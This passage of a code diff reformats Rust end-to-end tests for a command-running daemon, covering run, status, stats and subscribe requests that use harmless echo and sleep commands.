+        let resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "nonexistent_tool_xyz", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         if let Some(error) = resp.result.get("error") {
             let data = error["data"].as_object().unwrap();
             assert!(data.contains_key("command"));
@@ -1012,9 +1211,14 @@ mod tests {
     #[tokio::test]
     async fn e2e_status_includes_db_size() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo status_test", "mode": "sync",
-        })).await.unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo status_test", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
         let resp = conn.send_request(METHOD_STATUS, serde_json::json!({})).await.unwrap();
         assert!(resp.result["tasks_total"].as_u64().unwrap() >= 1);
         assert!(resp.result.get("db_size_bytes").is_some());
@@ -1023,9 +1227,14 @@ mod tests {
     #[tokio::test]
     async fn e2e_stats_full() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
-        conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo stats_test", "mode": "sync",
-        })).await.unwrap();
+        conn.send_request(
+            METHOD_RUN,
+            serde_json::json!({
+                "command": "echo stats_test", "mode": "sync",
+            }),
+        )
+        .await
+        .unwrap();
         let resp = conn.send_request(METHOD_STATS, serde_json::json!({})).await.unwrap();
         assert!(resp.result["total_tasks"].as_u64().unwrap() >= 1);
         assert!(resp.result["total_events"].as_u64().unwrap() >= 1);
@@ -1037,16 +1246,28 @@ mod tests {
     async fn e2e_subscribe_completed_task() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
         // Run a sync task — completes immediately
-        let run_resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "echo subscribe_immediate", "mode": "sync",
-        })).await.unwrap();
+        let run_resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "echo subscribe_immediate", "mode": "sync",
+                }),
+            )
+            .await
+            .unwrap();
         let task_id = run_resp.result["task_id"].as_str().unwrap().to_string();
         assert_eq!(run_resp.result["status"], "completed");
 
         // Subscribe to the completed task — should return immediately
-        let sub_resp = conn.send_request(METHOD_SUBSCRIBE, serde_json::json!({
-            "task_id": &task_id,
-        })).await.unwrap();
+        let sub_resp = conn
+            .send_request(
+                METHOD_SUBSCRIBE,
+                serde_json::json!({
+                    "task_id": &task_id,
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(sub_resp.result["task_id"], task_id);
         assert_eq!(sub_resp.result["status"], "completed");
         assert!(sub_resp.result["exit_code"].as_i64().unwrap() == 0);
@@ -1057,20 +1278,33 @@ mod tests {
     async fn e2e_subscribe_running_task() {
         let (mut conn, _notif_rx, _store, _tmp) = spawn_daemon_pair().await;
         // Run an async task that takes ~500ms
-        let run_resp = conn.send_request(METHOD_RUN, serde_json::json!({
-            "command": "sleep 0.3 && echo done", "mode": "async",
-        })).await.unwrap();
+        let run_resp = conn
+            .send_request(
+                METHOD_RUN,
+                serde_json::json!({
+                    "command": "sleep 0.3 && echo done", "mode": "async",
+                }),
+            )
+            .await
+            .unwrap();
         let task_id = run_resp.result["task_id"].as_str().unwrap().to_string();
         assert_eq!(run_resp.result["status"], "running");
 
         // Subscribe — should block until the task completes
-        let sub_resp = conn.send_request(METHOD_SUBSCRIBE, serde_json::json!({
-            "task_id": &task_id,
-        })).await.unwrap();
+        let sub_resp = conn
+            .send_request(
+                METHOD_SUBSCRIBE,
+                serde_json::json!({
+                    "task_id": &task_id,
+                }),
+            )
+            .await
+            .unwrap();
         assert_eq!(sub_resp.result["task_id"], task_id);
         assert!(
             sub_resp.result["status"] == "completed" || sub_resp.result["status"] == "failed",
-            "expected completed or failed, got {:?}", sub_resp.result["status"]
+            "expected completed or failed, got {:?}",
+            sub_resp.result["status"]
         );
         assert!(sub_resp.result["exit_code"].as_i64().unwrap() == 0);
         assert!(sub_resp.result["duration_ms"].as_u64().is_some());
